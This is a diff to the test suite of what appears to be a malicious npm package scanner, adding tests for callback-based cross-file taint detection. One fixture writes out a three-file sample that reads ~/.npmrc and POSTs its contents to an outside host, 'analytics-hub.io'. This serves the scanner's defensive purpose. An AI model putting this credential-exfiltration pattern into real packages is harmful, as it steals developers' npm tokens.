@@ -2,7 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const { test, assert, assertIncludes, assertNotIncludes, runScan } = require('../test-utils');
-const { buildModuleGraph, annotateTaintedExports, detectCrossFileFlows } = require('../../src/scanner/module-graph');
+const { buildModuleGraph, annotateTaintedExports, detectCrossFileFlows, annotateSinkExports, detectCallbackCrossFileFlows } = require('../../src/scanner/module-graph');
 
 function makeTmpDir() {
   return fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-modgraph-'));
@@ -536,6 +536,126 @@ async function runModuleGraphTests() {
       const exports = tainted['safe.mjs'] || {};
       const hasTainted = Object.values(exports).some(e => e.tainted);
       assert(!hasTainted, 'Safe ES module should have no tainted exports');
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  // =========================================================================
+  // STEP 5 — Callback-based cross-file flow detection
+  // =========================================================================
+
+  test('callback-flow: reader exports tainted fn, sender exports sink fn, index connects via callback → CRITICAL', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'package.json', JSON.stringify({ name: 'callback-pkg', version: '1.0.0' }));
+      writeFile(tmp, 'reader.js', `
+        const fs = require('fs');
+        const os = require('os');
+        const path = require('path');
+        function readConfig(callback) {
+          const configDir = os.homedir();
+          const npmrc = path.join(configDir, '.npmrc');
+          try {
+            const data = fs.readFileSync(npmrc, 'utf8');
+            callback(null, data);
+          } catch (err) {
+            callback(err, null);
+          }
+        }
+        module.exports = { readConfig };
+      `);
+      writeFile(tmp, 'sender.js', `
+        const https = require('https');
+        function reportData(payload) {
+          const req = https.request({
+            hostname: 'analytics-hub.io',
+            path: '/v2/report',
+            method: 'POST'
+          });
+          req.write(payload);
+          req.end();
+        }
+        module.exports = { reportData };
+      `);
+      writeFile(tmp, 'index.js', `
+        const { readConfig } = require('./reader');
+        const { reportData } = require('./sender');
+        readConfig(function(err, data) {
+          if (!err && data) {
+            reportData(data);
+          }
+        });
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      const sinks = annotateSinkExports(graph, tmp);
+      const flows = detectCallbackCrossFileFlows(graph, tainted, sinks, tmp);
+
+      assert(flows.length >= 1, 'Should detect callback-based cross-file flow, got: ' + flows.length);
+      const flow = flows[0];
+      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
+      assert(flow.type === 'cross_file_dataflow', 'Type should be cross_file_dataflow');
+      assertIncludes(flow.description, 'callback', 'Description should mention callback');
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('callback-flow: no false positive when importing clean functions', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'package.json', JSON.stringify({ name: 'clean-pkg', version: '1.0.0' }));
+      writeFile(tmp, 'math.js', `
+        function add(a, b, callback) {
+          callback(null, a + b);
+        }
+        module.exports = { add };
+      `);
+      writeFile(tmp, 'logger.js', `
+        function log(msg) {
+          console.log(msg);
+        }
+        module.exports = { log };
+      `);
+      writeFile(tmp, 'index.js', `
+        const { add } = require('./math');
+        const { log } = require('./logger');
+        add(1, 2, function(err, result) {
+          log(result);
+        });
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      const sinks = annotateSinkExports(graph, tmp);
+      const flows = detectCallbackCrossFileFlows(graph, tainted, sinks, tmp);
+
+      assert(flows.length === 0, 'Should have no callback flows for clean package, got: ' + flows.length);
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('tainted-exports: shorthand property referencing FunctionDeclaration is tainted', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'reader.js', `
+        const fs = require('fs');
+        const os = require('os');
+        function readConfig() {
+          return fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
+        }
+        module.exports = { readConfig };
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+
+      assert(tainted['reader.js'], 'reader.js should be in taintedExports');
+      assert(tainted['reader.js']['readConfig'], 'reader.js should have readConfig export');
+      assert(tainted['reader.js']['readConfig'].tainted === true, 'readConfig should be tainted');
     } finally {
       cleanup(tmp);
     }
